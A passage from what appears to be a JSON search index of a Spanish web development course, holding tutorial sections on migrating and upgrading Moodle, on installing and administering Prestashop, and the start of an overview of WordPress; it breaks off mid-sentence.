incluye también el directorio moodledata completo. | Descargar un volcado SQL de la base de datos. | Poner la aplicación en “modo mantenimiento”, para que nadie la use mientras dure la migración. | Subir el código fuente al nuevo servidor. | Crear una base de datos vacía en el nuevo servidor. A ser posible, con el mismo nombre que tenía en el viejo servidor. | Ejecutar el volcado SQL en la base de datos vacía para reproducir el contenido de la base de datos del servidor antiguo en el nuevo. | Revisar el archivo de configuración del CMS por si hay que cambiar alguna variable. En el caso de Wordpress, recuerda que ese archivo es wp-settings.php. En el caso de Moodle, el archivo se llama config.php y está ubicado en la raíz de la instalación. | Si has cambiado de dominio, te queda un paso adicional (si el dominio es el mismo, no tienes que hacer nada en este punto). Se trata de acceder a la base de datos de Moodle y buscar manualmente en todas las tablas cualquier referencia al viejo servidor para cambiarlas. Vamos a explicar esto último mejor. Supón que estás moviendo tu Moodle de una URI como esta: https://servidor-antiguo/moodle a una URI como esta: https://servidor-nuevo/moodle. Además de todo lo que hemos explicado en los pasos del 1 al 7, vas a tener que bucear en las tablas de la base de datos para buscar el texto “https://servidor-antiguo/moodle” y sustituirlo por “https://servidor-nuevo/moodle”. Dependiendo de los plugins que tengas instalados, puedes encontrar esa cadena unas pocas veces o cientos de veces. Si tienes experiencia con bases de datos, puedes programar un pequeño programa que se encargue de hacer la búsqueda y la sustitución de forma automática. También puedes recurrir a clientes como PHPMyAdmin y MySQL Workbench, que te permiten hacer búsquedas y sustituciones de forma masiva en las tablas. Si no tienes experiencia con bases de datos… Bueno, en ese caso tendrás que armarte de paciencia o hacer un cursillo acelerado. | . Una vez hecho todo esto, Moodle (o Wordpress, o el CMS que sea) debería estar funcionando en el nuevo servidor con normalidad. Otro consejo importante: recuerda que Moodle es más exigente que Wordpress en cuanto a la configuración del servidor. Para evitar problemas con la migración, lo más conveniente es que el nuevo servidor tenga una configuración lo más parecida posible al antiguo. Esto incluye la versión de PHP y de MySQL (o la base de datos que uses), así como las extensiones de PHP instaladas. Y un último consejo: cuando vayas a empezar la migración, consigue un buen cargamento de café y no te olvides de cruzar los dedos. Actualización . Otro quebradero de cabeza con Moodle son las actualizaciones. Los CMS, como cualquier otro programa, conviene tenerlos siempre actualizados para evitar problemas de seguridad y de rendimiento. Wordpress es fácil de actualizar: el propio panel de administración te avisará cuando haya una nueva versión, y actualizarás el sistema con un par de clics. Aunque a veces pueden surgir contratiempos y es buena idea disponer de una copia de seguridad de la web antes de hacerlo, es una operación que no suele plantear problemas. Con Moodle, la situación es en teoría igual de fácil, pero en la práctica no. Recuerda que es un sistema muuucho más grande y complejo de Wordpress, así que las actualizaciones son proporcionalmente más grandes y complejas también. La actualización de Moodle, por lo tanto, es un proceso largo, complejo y delicado. Asegúrate de seguir a rajatabla y muy despacito estos pasos: . | Haz una copia de seguridad de todos los archivos de tu Moodle (incluyendo moodledata) y de la base de datos. Descarga esa copia en un lugar seguro (no la dejes en tu servidor). Si algo sale mal, siempre puedes tratar de restaurar el Moodle que tenías. | Averigua qué versión de Moodle tienes. Esto lo puedes ver en “Site administration” -&gt; “Notifications” | Averigua a qué versión de Moodle tienes que migrar. Si estás, digamos, en la versión 2.4, no puedes saltar a la 3.11 así, alegremente. Tienes que ir saltito a saltito, actualizando a las versiones críticas intermedias. Estas versiones críticas, en el momento de escribir esto (septiembre de 2021) son: . 1.3 &gt; 1.6 &gt; 1.8 &gt; 1.9 &gt; 2.2 &gt; 2.7 &gt; 3.1 &gt; 3.6 &gt; 3.11 . Es decir, si tu versión actual es la 2.4 y quieres llegar a la 3.11, primero tienes que actualizar a la versión crítica más cercana (la 2.7), y luego saltar a la siguiente (3.1), a la siguiente (3.6) y por fin llegar a tu versión de destino (3.11). | Descarga todas las versiones de Moodle por las que vas a tener que pasar hasta llegar a tu versión destino. Asegúrate de que tu servidor cumple los requisitos mínimos para poder instalarlas. | Pon tu Moodle en “modo mantenimiento”. Esto se hace en “Site administration” -&gt; “Server” &gt; “Maintenance mode”. | Si tu versión de Moodle actual es 3.0 o posterior, necesitarás establecer una “password de actualización” en tu archivo config.php. Simplemente, abre el archivo config.php y agrega esta línea: . $CFG-&gt;upgradekey = ‘tu-password’; . La password debe tener al menos 8 caracteres y mezclar números, letras y caracteres especiales. | Entra en los archivos de tu servidor y renombra la carpeta donde tengas instalado el Moodle actual. Vamos a suponer, por ejemplo, que lo tienes instalado en una carpeta llamada “aulavirtual”. Pues bien, renómbrala a algo como “aulavirtual-antigua”. | Sube la versión a la que vas a actualizar al servidor a la carpeta donde tenías el viejo Moodle (en nuestro ejemplo, “aulavirtual”). Recuerda que debes actualizar de manera incremental. Es decir, si tu viejo Moodle estaba en la versión 2.4, el Moodle que debes subir en este paso es la versión 2.7. | Copia el config.php de la instalación antigua en la nueva. | Abre un navegador web y escribe la URI del nuevo Moodle seguida de “/admin”. En nuestro ejemplo, esa URI sería: https://tu-servidor/aulavirtual/admin. Se iniciará la actualización de Moodle. Si incluiste una clave de actualización en config.php, en este punto de la pedirá. | La actualización hará algunas comprobaciones. Es posible que te salte algún error y no puedas continuar. Los errores más frecuentes se deben a extensiones de PHP que la nueva versión necesita y la vieja no, o bien a plugins o plantillas que no son compatibles con la nueva versión. Debes resolver estos problemas antes de continuar. Para las extensiones de PHP, configura bien tu servidor. Para los plugins y plantillas, vuelve a renombrar las carpetas de Moodle (“aulavirtual” pasará a “aulavirtual-nueva” y “aulavirtual-antigua” pasará a “aulavirtual”) y accede a tu viejo Moodle. Desinstala los plugins o plantillas que te causan problemas y vuelve a dejar los nombres de las carpetas como estaban para poder lanzar de nuevo la actualización. | Cuando hayas superado todas las comprobaciones, simplemente pulsa el botón de “Continuar con la actualización” y cruza los dedos. | Sigue las indicaciones del actualizador. Con un poco de suerte, al terminar tendrás tu Moodle actualizado. | Repite los pasos del 7 al 13 hasta llegar a la versión de Moodle que te interesa alcanzar. | . Como ves, es un proceso largo y tedioso, donde pueden surgir mil complicaciones. No es raro encontrarse con que una actualización de Moodle resulta inviable. Por ejemplo, porque tu Moodle dependa fuertemente de un plugin incompatible con las nuevas versiones. O por cualquier otra razón. En esos casos, una alternativa es hacer una instalación limpia con la versión más actual y luego exportar e importar los cursos uno a uno. Por supuesto, esto solo es viable si tu organización tiene un número reducido de cursos. En situaciones extremas, la actualización de Moodle se vuelve imposible. Qué le vamos a hacer. Una última advertencia: si dispones de tiempo suficiente para ello, te sugiero hagas una copia local de tu Moodle actual y pruebes la actualización en primer lugar sobre esa copia. Si te vas a encontrar con alguna sorpresa desagradable al actualizar, mejor que te la encuentres en una copia local que en el servidor real. Y que la fuerza te acompañe porque la vas a necesitar. ",
    "url": "https://iescelia.org/docs/dwes/_site/cms/moodle.html#13-moodle",
    "relUrl": "/cms/moodle.html#13-moodle"
  },"135": {
    "doc": "1.3 Moodle",
    "title": "1.3 Moodle",
    "content": " ",
    "url": "https://iescelia.org/docs/dwes/_site/cms/moodle.html",
    "relUrl": "/cms/moodle.html"
  },"136": {
    "doc": "1.4 Prestashop",
    "title": "1.4. Prestashop",
    "content": ". | 1.4.1. Características de Prestashop | 1.4.2. Instalación de Prestashop | 1.4.3. Y después de instalar, ¿qué? Breve guía para el administrador novato | 1.4.4. Explotación de Prestashop | . (La información de esta sección está adaptada de doc.prestashop.com, donde se publicó originalmente con licencia free Atlassian Confluence Open Source Project. En el momento de escribir estas líneas, la documentación ya no está en línea, pero aún puede encontrarse en The Wayback Machine) . 1.4.1. Características de Prestashop . Prestashop es un CMS de código abierto para la creación de comercios online de cualquier tipo. Actualmente es el líder indiscutible en su sector, aunque tiene algunos competidores serios como Magento, VooCommerce (un plugin para Wordpress), VirtueMart (un plugin para Joomla!) o Shopify. Como sucede con otros CMS de código abierto, aunque el código fuente de Prestashop es libre y gratuito y dispone de muchos plugins y plantillas que también son gratuitas, hay muchas otras de pago. En el caso de Prestashop, esta vía de negocio es aún más acusada que con Wordpress o Moodle, de manera que es difícil (aunque no imposible) poner en marcha una tienda online basada en Prestashop sin recurrir a algunos complementos de pago. En esta sección, vamos a hacer un repaso muy rápido a las características principales de Prestashop. 1.4.2. Instalación de Prestashop . Requisitos previos . Para instalar PrestaShop necesitas, como pasa con cualquier CMS escrito en PHP, un servidor web con soporte para PHP y un servidor de bases de datos (MySQL, MariaDB, PostgreSQL o similar). La configuración del servidor es algo más exigente que con Wordpress. Como sucedía con Moodle, necesitarás que ciertas extensiones estén habilitadas en el servidor para que Prestashop funcione correctamente. Asegúrate de contratar un proveedor de hosting que sea compatible con Prestashop antes de ponerte en marcha, o contacta con tu proveedor actual para ver qué posibilidades de reconfiguración de tu servidor actual te ofrece. Además, necesitarás un mínimo de 128 MB de RAM exclusivos para PHP. Pero eso solo es el mínimo. Prestashop consume muchos recursos. Cuanta más RAM tenga PHP a su disposición, mejor. Prestashop recomienda encarecidamente la instalación sobre un sistema Unix o tipo Unix (es decir, Linux). Siempre funcionará mejor y de forma más segura que sobre un servidor de Microsoft. Durante la instalación, el propio instalador hará un chequeo del servidor y te informará de cualquier problema de configuración antes de continuar. Pero, si lo prefieres, puedes consultar previamente la página oficial de requisitos del sistema. Proceso de instalación . Muchos proveedores de hosting permiten instalar Prestashop (igual que Wordpress, Moodle y muchos otros CMS) desde el panel de administración del propio hosting, con un par de clics. Si ese es tu caso, enhorabuena. Si no, siempre puedes recurrir a una instalación manual. El proceso de instalación de Prestashop es semejante al de cualquier otro CMS. A grandes rasgos, se trata de seguir estos pasos: . | Descarga la última versión de Prestashop del sitio oficial. | Sube el código fuente de Prestashop a tu servidor. Mejor si preparas previamente una carpeta para alojarlo. Ni que decir tiene que esa carpeta debería estar en una ubicación accesible vía web (es decir, dentro de htdocs, httpdocs o public_html). | Crea una base de datos vacía en tu servidor. | Lanza la instalación. Para eso, basta con que escribas la URI donde has alojado el código fuente de Prestashop. | Sigue las instrucciones del instalador. | Cuando la instalación haya terminado, elimina la carpeta /install. | . Algunos trucos y consejos . Utiliza siempre una versión de prueba, mejor en localhost, pero también puedes hacerlo en cualquier servidor. Cuando la hayas dejado a tu gusto, puedes moverla a su ubicación definitiva. Mover un Prestashop de un servidor a otro es como mover cualquier otro CMS: te llevas todos los archivos, la base de datos y cambias los datos de configuración (en el archivo app/config/parameters.php). No elimines tu versión de prueba de Prestashop. Más adelante, puede servirte como entorno de preproducción para probar cambios en tu tienda online sin que afecte a la versión en producción. 1.4.3. Y después de instalar, ¿qué? Breve guía para el administrador novato . Prestashop construye toda la infraestructura para montar una tienda online, pero no la tienda en sí. Es decir, alguien se tiene que encagar de subir los productos, las categorías, los precios, las ofertas especiales… . Las posibilidades de Prestashop son inmensas y, al principio, los administradores pueden sentirse un poco perdidos al acceder al panel de administración. En esta sección hablaremos de las acciones más comunes en el trabajo inicial con Prestashop (cuando áun estás montando la tienda) y también en el día a día cuando la tienda ya está en uso. En esta sección, vamos a resumir los pasos más importantes que debe dar un administrador cuando pretende poner en marcha una tienda online con un Prestashop recién instalado. Acceder al panel de administración . Lo primero que tienes que saber es cómo entrar al panel de administración o “sala de máquinas” de tu Prestashop. Simplemente, abre tu navegador web preferido y añade la ruta “admin” a la URI de tu Prestashop. Es decir, si instalaste Prestashop en https://mi-servidor/mi-prestashop, encontrarás el acceso al panel de administración en https://mi-servidor/mi-prestashop/admin . Desactivar la tienda online: modo mantenimiento y modo catálogo . Una tarea habitual tras finalizar una instalación limpia, o cuando vas a meter mano a lo bestia en tu tienda, es poner Prestashop en “modo mantenimiento”, de manera que cualquier posible visitante no se encuentre una tienda a medio construir (lo cual da muy mala imagen), sino el aviso de que la tienda está, en efecto, a medio construir. Acceder al panel de administración y ve a la sección “Shop Parameters / General”. Las opciones sobre el modo mantenimiento están en la segunda pestaña. Además de activar/desactivar tu tienda, puedes indicar una dirección IP a través de la cual tú podrás seguir visitando la tienda para ver cómo quedan los cambios. Cuando ya te hayas decidido por una plantilla y hayas subido unos cuantos productos, puedes preferir poner la tienda en “modo catálogo”. Esto es un punto intermedio entre el “modo mantenimiento” (la tienda es completamente inaccesible) y el modo de funcionamiento normal. En el “modo catálogo”, los visitantes podrán navegar por tu tienda y visitar los productos, pero no les aparecerán ni los precios ni los botones de compra. Puedes activar/desactivar el “modo catálogo” en la sección “Shop Parameters / Products Settings” del panel de administración. Borrar el contenido por defecto de la tienda . La instalación por defecto de Prestashop incluye un conjunto de datos de ejemplo que seguramente querrás eliminar. Los datos de prueba dependen de tu instalación concreta y de la versión de Prestashop. Los datos de ejemplo que tendrás que eliminar incluyen productos, categorías, atributos, proveedores, imágenes, etiquetas, pedidos, clientes y páginas estáticas. Sin embargo, tal vez te interese conservar por un tiempo estos datos de prueba para ver cómo luce la tienda cuando tiene datos cargados, al menos hasta que acabes de echar un vistazo a todas las opciones de Prestashop. Para eliminar todo esto, puedes bucear por el panel de administración y borrar los elementos que no te sirven de uno en uno (o, tal vez, modificar algunos en lugar de borrarlos para adaptarlos a tus necesidades). Es un trabajo largo y tedioso. Por suerte, existe un plugin llamado Database Cleaner que te permitirá resetear la base de datos de forma muy rápida: . | Accede a la sección “Modules &gt; Modules &amp; Services” del panel de administración. | Busca el módulo “Database Cleaner” y haz clic en el botón “Install”. Esto instalará el plugin. | Haz clic en el botón “Configure”. | Acepta el warning y haz clic en los botones “Delete Catalog” y “Delete Orders &amp; Customers”. Esto limpiará de datos tu base de datos. ¡Cuidado! A menos que tengas copia, esos datos son irrecuperables. | Haz clic en el botón “Check &amp; fix” para revisar la integridad de tus tablas. | Haz clic en el botón “Clean &amp; optimize” para reorganizar los índices y dejar la base de datos en condiciones óptimas. | . Configuración básica de tu tienda online . Ahora nos refererimeos a las cosas que tienes que configurar necesariamente a la hora de crear una tienda con Prestashop. Antes de nada, es importante que entiendas que una cosa es la configuración del núcleo de Prestashop y otra la configuración de cada plugin, que en Prestashop se denominan módulos. El núcleo de Prestashop se configura buceando en el panel de administración, en las secciones que veremos a continuación. En cambio, los plugins se configuran desde “Modules” &gt; “Installed Modules” &gt; “Configure”. Como es lógico, cada plugin tiene sus propias opciones de configuración y debes remitirte a la documentación del desarrollador para conocerlas. Aquí nos referiremos únicamente a la configuración básica del núcleo de Prestashop y de algunos módulos especialmente útiles. Una vez aclarado esto, entremos en faena. Cuando tengas una instalación limpia de Prestashop preparada, las cosas que debes configurar como mínimo son estas: . | El nombre de tu negocio. Se hace en *“Shop Parameters” &gt; “Contact” &gt; “Stores” &gt; “Contact details” &gt; “Shop name”. Esto es muy importante hacerlo para que los buscadores te indexen adecuadamente. | El logo de la tienda. El logo se verá en todas las página de la tienda online y en las facturas y emails que se emitan desde la tienda. Se accede a él en la ruta *“Design” &gt; “Theme &amp; Logo” &gt; “Your current theme”. | La moneda por defecto. Es la moneda en la que se mostrarán los precios de los productos. Se configura en “International” &gt; “Localization” &gt; “Configuration”. | La información de contacto de la tienda. Hay que establecer, al menos, el número de teléfono y una dirección de email. Se hace en “Shop Parameters” &gt; “Contact” &gt; “Stores” &gt; “Contact details”. | Slider de imágenes. El slider es una secuencia de imágenes que aparecen una tras otra, normalmente en la parte superior del home (aunque esto depende de la plantilla). Es slider es importantísimo desde el punto de vista del atractivo visual de la tienda. Puedes definirlo en la sección dedicada al módulo “Image slider”. | Páginas estáticas. Las páginas estáticas, como en Wordpress, se usan para crear las típicas páginas de “Acerca de”, “Aviso legal”, “Términos y condiciones” y cosas así. Encontrarás que algunas ya existen en los datos por defecto, y puedes adaptarlas a tus necesidades. Otras tendrás que crearlas por tu cuenta. En ambos casos, puedes hacerlo desde “Design” &gt; “Pages”. | Redes sociales. Las principales redes sociales de la empresa pueden gestionarse desde el módulo “Social media follow links”. | Top menu. El top menu es el menú principal de tu tienda. Suele mostrarse en la parte superior de todas las páginas, aunque esto, lógicamente, podría cambiar según la plantilla que uses. En el top menu puedes mostrar tus categorías de productos, así como links a otras páginas. Se gestiona desde el módulo “Main menu”. | Contenido de la homepage. La plantilla por defecto incluye contenido variado para el home: textos, imágenes, links, etc. Si vas a usar el tema por defecto, puedes modificar este contenido (o eliminarlo antes de crear el tuyo). La homepage se manipula a través de diferentes módulos. Estos son los principales a los que deberías echar al menos un vistazo: . | Banner: Para cambiar la imagen que aparece al final de la homepage. | Custom text blocks: Mensajes de texto que aparecen debajo del banner. | Theme modules: Configuración de la plantilla actual. | Legal compliance: Información legal, que puede variar según el mercado al que te dirijas. | . | Idioma, métodos de pago y envíos. Estos tres elementos son muy importantes y algo más complejos de configurar, por lo que los vamos a tratar en los siguientes apartados. | Instalar plugins y plantilla. También hablaremos de ello un poco más abajo. | Dar de alta categorías y productos. Cuando hayas pasado por todos los puntos anteriores, habrá llegado el momento de comenzar a dar crear categorías y productos en tu Prestashop. A partir de ahí, tu tienda online será plenamente funcional. | . A continuación, discutimos con un poco más de detalle algunos de los puntos anteriores. Cambiar el idioma . Prestahop se instala por defecto en inglés. Si te has bajado el paquete de instalación en otro idioma, se instalará ese otro idioma y, además, el inglés, por lo que puedes estar seguro de que, sea cual sea la instalación de Prestashop con la que trabajes, la encontrarás, al menos, en inglés. Por eso es buena idea que te familiarices con el interfaz del panel de administración en inglés. Así, de paso, practicas el idioma. Cuando hay varios paquetes de idioma instalados, el front-end mostrará un selector en la parte superior para que el visitante elija en qué idioma desea ver la página. El back-end también se mostrará en los diferentes idiomas, aunque, en este caso, tendremos un selector de idioma para cada campo de texto. Si necesitas instalar cualquier otro idioma, puedes hacerlo desde el menú “International” &gt; “Localization / Languages”. Puedes instalar todos los paquetes de idioma que quieras, pero ten en cuenta que las descripciones de los productos tendrás que traducirlas tú. También los nombres de los productos, las categorías, las etiquetas, las páginas estáticas, etc. Prestashop no lo hará automáticamente por ti. Métodos de pago . Otra cosa muy importante es configurar los métodos de pago. Esto se hace en *“Modules” &gt; “Installed Modules” “Payments &amp; Gateways”. Muchos métodos de pago necesitarán que primero te registres como vendedor en el servicio correspondiente, como, por ejemplo, PayPal. Por defecto, solo estarán activados dos métodos de pago: “Cheque” y “Transferencia bancaria”. Ambos deben configurarse con tu información bancaria para poder recibir los pagos. Esto se hace en los módulos “Payments by check” y “Wire payment”. Si activas cualquier otro método de pago, tendrás que configurarlo, como es lógico, desde su módulo. Y si no encuentras el método de pago que necesitas, puedes instalar otros desde el marketplace de plugins de Prestashop. Configuración de los envíos . Cualquier tienda online necesita que configures también los envíos (excepto si lo que vendes son productos descargables, claro). Los envíos se configuran en el menú “Shipping”. Los envíos por correo, si los vas a llevar tú en persona a la oficina, son los más fáciles de configurar. Si contratas los envíos con cualquier empresa de transportes, necesitarás instalar el módulo para Prestashop de esa empresa para poder configurar y automatizar los envíos, de manera que los compradores puedan acceder, por ejemplo, a la información de seguimiento del mismo. La devolución de productos está, en principio, deshabilitada. Si deseas habilitarla y configurarla, echa un vistazo a *“Customer service” &gt; “Merchandise returns” &gt; “Merchandise return (RMA) options”. Instalación de plugins (modules) . Prestashop tiene un montón de plugins (o modules, en jerga de Prestashop) disponibles para realizar tareas de lo más diverso: análisis de tráfico, métodos de pago y envío, diseño y navegación por la web, marketing, etc. Eso, solo entre los plugins “oficiales” que puedes encontrar en el marketplace de Prestashop. Si hablamos de plugins de terceras partes, la oferta se multiplica. El ecosistema de plugins es tan amplio que no es posible tratarlo aquí ni en ningún otro sitio. Si alguna vez necesitas alguna funcionalidad extra de Prestashop, simplemente bucea por el marketplace para buscar un plugin que haga lo que necesitas. La dirección de marketplace oficial de Prestashop es: http://addons.prestashop.com/en/2-modules-prestashop. Cuando instales un plugin, tendrás que activarlo y configurarlo. Asegúrate de que funciona correctamente y que se lleva bien con tu plantilla antes de continuar. Si te causa problemas, prueba a cambiar la configuración o, en última instancia, desinstálalo e inténtalo con otro. Un plugin desmadrado puede fastidiar el funcionamiento de toda la web. Elección de la plantilla (theme) . Dejamos para el final uno de los aspectos más importantes en cualquier CMS: elegir e instalar una plantilla. La plantilla o theme, como en Wordpress, Moodle o cualquier otro CMS, determina la manera en la que se ve tu web. Es decir, afecta al aspecto pero no al contenido. Existen muchas plantillas para elegir en el marketplace de Prestashop: http://addons.prestashop.com/en/3-templates-prestashop. Muchas son gratuitas, otras muchas de pago y, la mayoría, tienen una versión gratuita limitada y una versión de pago con más opciones. También puedes desarrollar tu propia plantilla, por supuesto. Hay toda una rama de programadores profesionales especializados en desarrollo de plantillas y plugins para Prestashop. Sin embargo, eso excede de los propósitos de este texto. 1.4.4. Explotación de Prestashop . Después de instalar y configurar los aspectos más importantes de tu Prestashop, ya te habrás familiarizado bastante con el panel de administración. En esta sección, vamos a hacer un rápido recorrido por ese panel por si se te ha escapado algo. El diseño del panel de administración, como en cualquier CMS, puede variar un poco entre versiones. En general, es un panel intuitivo y fácil de usar, aunque al principio puede intimidar un poco por el elevado número de elementos que contiene. Vamos a tratar de poner un poco de orden en ese caos. La barra superior . La barra superior del panel de administración contiene información muy útil y links importantes: . | La versión de Prestashop. | Links de acceso rápido (se pueden configurar a tu gusto haciendo clic en “Manage quick accesses”). | Barra de búsqueda. | Modo depuración. Puede ayudarte a localiar la causa del error si estás teniendo problemas con tu Prestashop o con algún módulo. | View my shop. Esto sirve para ver la tienda como la vería un visitante. | Notificaciones pendientes (incluye los últimos pedidos sin procesar). | Enlace directo a los últimos pedidos realizados, los últimos clientes registrados y los últimos mensajes recibidos. | Acceso al perfil del usuario que está logueado. | . Menús . Durante la administración de una tienda Prestashop, tendrás que navegar constantemente por un montón de páginas con opciones de configuración. El menú principal persigue facilitar esa navegación. Desde Prestashop 1.7, el menú principal está dividido en 3 grandes secciones: . | Sell. Esta es la sección en la que más se trabaja en el día a día de la explotación de un Prestashop. Aquí encontrarás el acceso a los pedidos realizados y al catálogo de productos en venta. También puedes acceder a los clientes, a la atención al cliente (devoluciones y cosas así) y a las estadísticas de visitas y ventas. | Improve. En esta sección, puedes modificar la configuración de tu Prestashop para adaptarlo a tus necesitades. Aquí encontrarás el acceso a los módulos (plugins) instalados, las plantillas, los métodos de pago y envío y la configuración del idioma. | Configure. En esta sección encontrarás la configuración avanzada de Prestashop, así que, en principio, no tienes necesidad de tocar nada. Hay cosas como configuración de los backups automáticos, empleados de la empresa, configuración de algunos parámetros del núcleo de Prestashop, configuración del servidor web… | . Los botones . Muchas página del panel de administración usan botones en la parte superior e inferior. Por ejemplo, la página para editar un producto puede mostrar hasta 8 botones al mismo tiempo. Los botones siempre son los mismos y tienen el mismo comportamiento en todo el panel de administración. Los más habituales son los siguientes: . | Add new. Abre una página de creación de un recurso, dependiendo del contexto: un nuevo producto, una nueva categoría, un nuevo pedido… | Recommended Modules and Services. Abre una ventana modal que contiene los módulos (plugins) disponibles en el contexto actual. Por ejemplo, en la página “Shipping &gt; Carriers”, este botón mostrará los plugins instalados en la categoría “Shipping &amp; Logistics”. Es muy útil cuando necesitas encontrar rápidamente qué módulo es adecuado instalar o configurar para obtener un resultado concreto. | Save y Save and stay. Almacena los cambios que se hayan hecho en la página actual. La única diferencia entre uno y otro es que el primero regresa a la página anterior y, el segundo, permanece en la página actual. | Export e Import. Exporta o importa los datos de la página actual en formato CSV (texto plano). | Refresh. Vuelve a cargar los datos de la página actual sin abandonarla. | . Las tres columnas principales del panel de administración . Además de los elementos anteriores, al entrar al panel de administración de Prestashop encontrarás tres columnas que ocupan casi todo el espacio disponible. Estas tres columnas, aunque puedan parecer abarrotadas a primera vista, proporcionan un excelente resumen del estado de tu tienda online. Encima de las tres columnas hay una barra que permite seleccionar el periodo de tiempo para el que se muestran los datos del resto del panl. Se pueden seleccionar valores como “día actual”, “mes actual”, “año actual”, “mes anterior”, “año anterior”, etc. También se puede seleccionar un rango de fechas cualquiera. Al cambiar el selector de fechas, los bloques de contenido del resto del panel se actualizan para mostrar los datos correspondientes a ese periodo. | La columna izquierda ofrece un vistazo rápido de la actividad de tu tienda en el periodo seleccionado: visitantes, carritos activos, pedidos pendientes de servir, solicitudes de devolución pendientes, carritos abandonados, stock de productos y estadísticas diversas. | La columna central muestra varios gráficos de ventas y una lista de los últimos pedidos. Se pueden seleccionar varios gráficos de gran interés para comprobar la evolución de las ventas, e incuso se pueden comparar varios gráficos entre sí para obtener más información. Haciendo clic en el botón de configuración, accedemos a otra página donde se muestran los ingresos y los gastos, así como el grado de consecución de los objetivos. | La columna derecha es de tipo informativo y contiene las última noticias sobre Prestashop, así como notificaciones sobre nuevas versiones y enlaces útiles. | . ",
    "url": "https://iescelia.org/docs/dwes/_site/cms/prestashop.html#14-prestashop",
    "relUrl": "/cms/prestashop.html#14-prestashop"
  },"137": {
    "doc": "1.4 Prestashop",
    "title": "1.4 Prestashop",
    "content": " ",
    "url": "https://iescelia.org/docs/dwes/_site/cms/prestashop.html",
    "relUrl": "/cms/prestashop.html"
  },"138": {
    "doc": "1.2 Wordpress",
    "title": "1.2. Wordpress",
    "content": ". | 1.2.1. Características principales de Wordpress | 1.2.2. Instalación y explotación de Wordpress | 1.2.3. Breve tour por Wordpress para novatos | 1.2.4. Cómo crear y modificar una plantilla de Wordpress | 1.2.5. Plugins de Wordpress | . Wordpress es sin duda el campeón actual de los CMS. Algunas estadísticas afirman que el 90% de los sitios web de internet está hecho con Wordpress. Probablemente son estadísticas un poco infladas, pero la importancia de este CMS es innegable y cualquier desarrollador web debe conocerlo, aunque sea para odiarlo. Wordpress es un CMS enfocado a la creación de blogs, pero, en su estadio actual, permite crear casi cualquier tipo de sitio web: tiendas online, portales, revistas digitales, álbumes de imágenes o recursos de cualquier tipo… . Está desarrollado en PHP bajo licencia GPL y se ha convertido en una auténtica plataforma de desarrollo web por sí mismo. Tiene detrás una enorme comunidad de desarrolladores y diseñadores, que se encargan de actualizarlo y de crear plugins y temas para la comunidad. 1.2.1. Características principales de Wordpress . Las características principales de Wordpress son: . | Separación entre el contenido y el diseño. El contenido se almacena en una base de datos. El diseño, en una plantilla, que es un conjunto de archivos CSS y PHP. | Apuesta decidida por la apariencia atractiva del resultado final (aunque esto depende mucho de la plantilla, claro) . | La estructura y diseño visual del sitio depende de un sistema de plantillas. Es decir: cambias la plantilla y todo el sitio web cambia de aspecto, conservando el mismo contenido. | La visualización final del contenido también depende de los plugins y widgets que se hayan instalado, y que pueden modificar sustancialmente en funcionamiento tanto del front-end como del back-end. | Código claro, bien estructurado y con una API bien documentada (alrededor del 50% de los programadores querrán internarme en un psiquiátrico por haber escrito esto). | Apuesta decidida por respetar las recomendaciones del W3C, aunque, desde luego, hay plugins y plantillas que no lo hacen. | Las entradas publicadas se ordenan por fecha, aunque esto se puede modificar. Wordpress se diseñó para hacer blogging y esa intención inicial aún permanece intacta, pero con un poco de manipulación puede emplearse para cualquier cosa. | . Funcionalidades de Wordpress . Wordpress hace magia. Así de sencillo. Si te vas a convertir en desarrollador/a web, Wordpress es tu peor enemigo, porque permite que cualquier usuario medio, sin tener ni idea de programación, pueda crear un sitio web solvente y de aspecto profesional en un rato. No te voy a engañar: a ti te llevaría meses programar algo parecido desde cero. Pero Wordpress también tiene sus limitaciones, y cuando sus usuarios las descubren, necesitan a un programador que sepa meterse en las tripas del sistema para retorcérselas. Ahí es donde entrarás tú. De modo que sí: Wordpress es tu peor enemigo, pero puede convertirse en tu mejor aliado. Para eso, tienes que conocer qué es capaz de hacer y qué no. Entre sus asombrosas funciones podemos contar estas: . | Fácil instalación, actualización y personalización. | Actualizaciones automáticas. | Múltiples usuarios con diferentes roles. | Capacidad de crear páginas estáticas además de entradas de blog. | Organización de las publicaciones por categorías y etiquetas (“tags”). | Buscador integrado de contenido. | Editor WYSIWYG (“What You See Is What You Get”) por bloques. | Guardado automático de los artículos mientras se escriben. | Moderación de comentarios. | Personalización de las URIs de cada publicación. | Distribución de los artículos y comentarios mediante RSS y otros mecanismos estandarizados. | Gestión intuitiva de la biblioteca multimedia. | Admite plugins para aumentar y/o modificar la fucionalidad del sistema, a riesgo de convertirlo en una “monstruo de Frankenstein” hecho a pegotes. | Admite plantillas que cambian de forma radical la apariencia del sitio. | Admite widgets o pequeñas utilidades adicionales que pueden ubicarse en los lugares que la plantilla permita. | . Plantillas de Wordpress . Las plantillas (o themes) de Wordpress son diseños CSS que sirven para establecer la apariencia y estructura del sitio web. Algunas también modifican parte del panel de administración. Hay una gran comunidad dedicada al diseño de estas plantillas. Puedes encontrarlas tanto en el sitio de Wordpress (comprobadas y aprobadas oficialmente) como en sitios web de terceros. Muchas son gratuitas, otras de pago y, la mayoría, tienen una versión gratuita con funciones adicionales de pago. Las posibilidades de las plantillas, tanto a nivel de diseño, estructura o gestión, son tan grandes que te permiten tener desde un simple blog hasta un sitio web completamente personalizable de forma intuitiva desde el panel de administración. Hay un gran campo de trabajo en las plantillas de Wordpress para un desarrollador web. Más adelante veremos como crear plantillas nuevas, algo que también te servirá para modificar las plantillas existentes. Widgets . Los widgets son pequeñas aplicaciones que proporcionan nuevas funcionalidades a un programa o que permiten un acceso rápido a funcionalidades usadas con frecuencia. Pueden ser vistosos como, por ejemplo, relojes en pantalla, calculadoras, calendarios o nubes de tags; o pueden ser discretos pero útiles como, por ejemplo, un cuadro con enlaces de interés o un contador del número de visitas. Wordpress incorpora un sistema de widgets para sus plantillas que ofrece numerosas posibilidades y flexibilidad para el diseño y estructura de sus blogs. Cada plantilla puede soportar un número diferente de Widgets en distintas posiciones de la pantalla. Plugins . Hay una monstruosa cantidad de plugins que potencian el uso de Wordpress y que lo convierten en un CMS prácticamente de propósito general. Encontrarás un plugin para casi cualquier cosa que se te ocurra. Bueno, no: encontrarás decenas de plugins para casi cualquier cosa que se te ocurra. Pero (¡siempre hay un pero!) con los plugins se corre el riesgo de empezar a parchear Wordpress hasta convertirlo en un amasijo informe de código puesto a pegotes. Muchos sitios web montados con Wordpress se vuelven ingobernables (y extraordinariamente lentos y pesados en la carga) por la gran cantidad de plugins que tienen activados. Otro problema de los plugins es que pueden provocar incontables problemas con las actualizaciones del 